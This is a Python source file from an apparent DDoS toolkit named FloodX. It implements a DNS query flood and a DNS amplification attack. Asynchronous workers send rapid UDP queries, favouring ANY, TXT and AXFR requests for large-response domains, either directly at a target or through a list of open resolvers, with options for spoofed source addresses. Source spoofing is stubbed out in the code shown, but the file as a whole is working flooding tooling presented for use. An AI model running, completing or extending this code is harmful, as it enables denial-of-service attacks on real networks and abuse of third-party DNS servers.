"""
FloodX: DNS Flood and Amplification Attack Implementation
DNS query flooding and amplification via recursive resolvers.
"""

import asyncio
import random
import time
import socket
from typing import Dict, Any, List
import dns.resolver
import dns.message
import dns.query

from common.logger import logger, stats_logger
from config import DNS_AMPLIFIERS


class DnsFlooder:
    """DNS flood attack with query amplification."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.port = config.get('port', 53)
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.queries_sent = 0
        self.bytes_sent = 0
        self.error_count = 0
        
        # DNS query types for amplification
        self.query_types = [
            'A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR',
            'ANY', 'AXFR', 'DNSKEY', 'DS', 'RRSIG', 'NSEC'
        ]
        
        # Domains that typically have large DNS responses
        self.amplification_domains = [
            'google.com', 'facebook.com', 'amazon.com', 'microsoft.com',
            'apple.com', 'netflix.com', 'twitter.com', 'youtube.com',
            'linkedin.com', 'github.com', 'stackoverflow.com', 'reddit.com'
        ]
        
        # DNS amplifier servers
        self.amplifiers = DNS_AMPLIFIERS.copy()
        random.shuffle(self.amplifiers)
        
        # Spoofing settings
        self.spoof_enabled = config.get('spoof_ip', False)
        self.spoof_ranges = config.get('spoof_ranges', [])

    async def run(self):
        """Execute the DNS flood attack."""
        logger.info(f"🔍 Starting DNS flood: {self.concurrency} queries/sec for {self.duration}s")
        
        try:
            self.running = True
            start_time = time.time()
            
            # Create semaphore for query rate limiting
            semaphore = asyncio.Semaphore(self.concurrency)
            
            # Launch query tasks
            tasks = []
            while self.running and (time.time() - start_time) < self.duration:
                # Launch new query tasks
                if len(tasks) < self.concurrency:
                    task = asyncio.create_task(self._dns_query_worker(semaphore))
                    tasks.append(task)
                
                # Clean up completed tasks
                tasks = [t for t in tasks if not t.done()]
                
                await asyncio.sleep(0.01)  # Brief pause
            
            # Stop attack
            self.running = False
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
                
        except Exception as e:
            logger.error(f"❌ DNS flood failed: {e}")
        finally:
            logger.info(f"✅ DNS flood completed: {self.queries_sent} queries, {self._format_bytes(self.bytes_sent)} sent")

    async def _dns_query_worker(self, semaphore: asyncio.Semaphore):
        """Individual DNS query worker."""
        async with semaphore:
            while self.running:
                try:
                    await self._send_dns_query()
                    self.queries_sent += 1
                    
                    # Update stats periodically
                    if self.queries_sent % 100 == 0:
                        stats_logger.update_stats(
                            packets_sent=self.queries_sent,
                            bytes_sent=self.bytes_sent,
                            errors=self.error_count
                        )
                    
                    # Small delay between queries
                    await asyncio.sleep(random.uniform(0.001, 0.01))
                    
                except Exception as e:
                    self.error_count += 1
                    logger.debug(f"DNS query error: {e}")
                    await asyncio.sleep(0.1)

    async def _send_dns_query(self):
        """Send a single DNS query."""
        try:
            # Choose query parameters
            domain = random.choice(self.amplification_domains)
            query_type = random.choice(self.query_types)
            
            # Choose DNS server (target or amplifier)
            if self.spoof_enabled and self.amplifiers:
                # Use amplifier for spoofed queries
                dns_server = random.choice(self.amplifiers)
                source_ip = self._generate_spoofed_ip() if self.spoof_ranges else None
            else:
                # Direct query to target
                dns_server = self.target
                source_ip = None
            
            # Create DNS query
            query = dns.message.make_query(domain, query_type)
            query.id = random.randint(1, 65535)
            
            # Add additional options for amplification
            if query_type == 'ANY':
                query.flags |= dns.flags.RD  # Recursion desired
                query.flags |= dns.flags.AD  # Authentic data
                
            # Serialize query
            query_data = query.to_wire()
            self.bytes_sent += len(query_data)
            
            # Send query via UDP
            if source_ip:
                await self._send_spoofed_udp(query_data, dns_server, 53, source_ip)
            else:
                await self._send_udp_query(query_data, dns_server, 53)
                
        except Exception as e:
            logger.debug(f"DNS query creation error: {e}")
            raise

    async def _send_udp_query(self, data: bytes, target: str, port: int):
        """Send UDP DNS query."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.settimeout(5)
            await asyncio.get_event_loop().run_in_executor(
                None, sock.sendto, data, (target, port)
            )
        finally:
            sock.close()

    async def _send_spoofed_udp(self, data: bytes, target: str, port: int, source_ip: str):
        """Send spoofed UDP packet (requires raw socket privileges)."""
        try:
            # This would require raw socket implementation
            # For now, fall back to regular UDP
            await self._send_udp_query(data, target, port)
        except Exception as e:
            logger.debug(f"Spoofed UDP send error: {e}")

    def _generate_spoofed_ip(self) -> str:
        """Generate random IP from spoofing ranges."""
        if not self.spoof_ranges:
            return None
        
        import ipaddress
        network = random.choice(self.spoof_ranges)
        
        # Generate random IP within the network
        network_int = int(network.network_address)
        broadcast_int = int(network.broadcast_address)
        random_int = random.randint(network_int, broadcast_int)
        
        return str(ipaddress.IPv4Address(random_int))

    def _format_bytes(self, bytes_value: int) -> str:
        """Format bytes with appropriate unit."""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_value < 1024:
                return f"{bytes_value:.1f} {unit}"
            bytes_value /= 1024
        return f"{bytes_value:.1f} TB"

    async def stop(self):
        """Stop the DNS flood attack."""
        logger.info("🛑 Stopping DNS flood...")
        self.running = False


class DnsAmplificationAttack:
    """Specialized DNS amplification attack using ANY queries."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.amplification_queries = 0
        self.amplification_factor = 0
        self.error_count = 0
        
        # High-amplification domains and queries
        self.amplification_targets = [
            ('isc.org', 'TXT'),           # Large TXT records
            ('google.com', 'ANY'),        # ANY query amplification
            ('facebook.com', 'MX'),       # Multiple MX records
            ('github.com', 'NS'),         # Multiple NS records
            ('cloudflare.com', 'TXT'),    # SPF/DKIM records
        ]

    async def run(self):
        """Execute DNS amplification attack."""
        logger.info(f"📡 Starting DNS amplification: targeting {len(DNS_AMPLIFIERS)} reflectors")
        
        try:
            self.running = True
            start_time = time.time()
            
            # Launch amplification workers
            tasks = []
            for amplifier in DNS_AMPLIFIERS[:self.concurrency]:
                task = asyncio.create_task(self._amplification_worker(amplifier))
                tasks.append(task)
            
            # Monitor attack
            while self.running and (time.time() - start_time) < self.duration:
                await asyncio.sleep(5)
                avg_factor = self.amplification_factor / max(self.amplification_queries, 1)
                logger.info(f"📡 DNS amp: {self.amplification_queries} queries, {avg_factor:.1f}x factor")
            
            # Stop attack
            self.running = False
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ DNS amplification failed: {e}")
        finally:
            total_factor = self.amplification_factor / max(self.amplification_queries, 1)
            logger.info(f"✅ DNS amplification completed: {total_factor:.1f}x average amplification")

    async def _amplification_worker(self, amplifier: str):
        """Worker for DNS amplification via specific reflector."""
        while self.running:
            try:
                domain, query_type = random.choice(self.amplification_targets)
                
                # Create amplification query
                query = dns.message.make_query(domain, query_type)
                query.flags |= dns.flags.RD  # Recursion desired
                
                # Send query to amplifier
                query_size = len(query.to_wire())
                
                try:
                    # Send query and measure response
                    response = await asyncio.get_event_loop().run_in_executor(
                        None, 
                        lambda: dns.query.udp(query, amplifier, timeout=5)
                    )
                    
                    response_size = len(response.to_wire())
                    amplification = response_size / query_size
                    
                    self.amplification_queries += 1
                    self.amplification_factor += amplification
                    
                    logger.debug(f"📡 {amplifier}: {query_size}B → {response_size}B ({amplification:.1f}x)")
                    
                except Exception as e:
                    self.error_count += 1
                    logger.debug(f"Amplifier {amplifier} error: {e}")
                
                # Delay between queries to this amplifier
                await asyncio.sleep(random.uniform(1, 3))
                
            except Exception as e:
                self.error_count += 1
                await asyncio.sleep(1)

    async def stop(self):
        """Stop the DNS amplification attack."""
        logger.info("🛑 Stopping DNS amplification...")
        self.running = False
